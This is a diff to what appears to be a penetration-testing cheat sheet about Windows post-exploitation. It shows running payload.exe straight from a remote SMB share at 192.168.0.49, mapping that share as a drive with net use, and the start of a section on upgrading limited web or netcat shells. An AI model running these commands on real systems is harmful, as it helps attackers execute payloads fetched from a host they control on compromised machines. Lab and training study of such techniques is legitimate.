@@ -208,6 +208,13 @@ By far the most interesting feature of the SMB Share method is that you can exec
 ```
 C:\Users\Admin>\\192.168.0.49\smbshare\payload.exe
 ```
+
+A fancy trick I learned from IPPSec is to create a mapped drive to a remote SMB share like so:
+```
+net use y: \\192.168.0.49\smbshare  
+y: 
+dir 
+```
  
 ## Upgrading your Windows Shell
 You might find that you are connected with a limited shell such as a Web shell, netcat shell or Telnet connection that simply is not cutting it for you. Here are a few oneliners you can use to upgrade your shell:
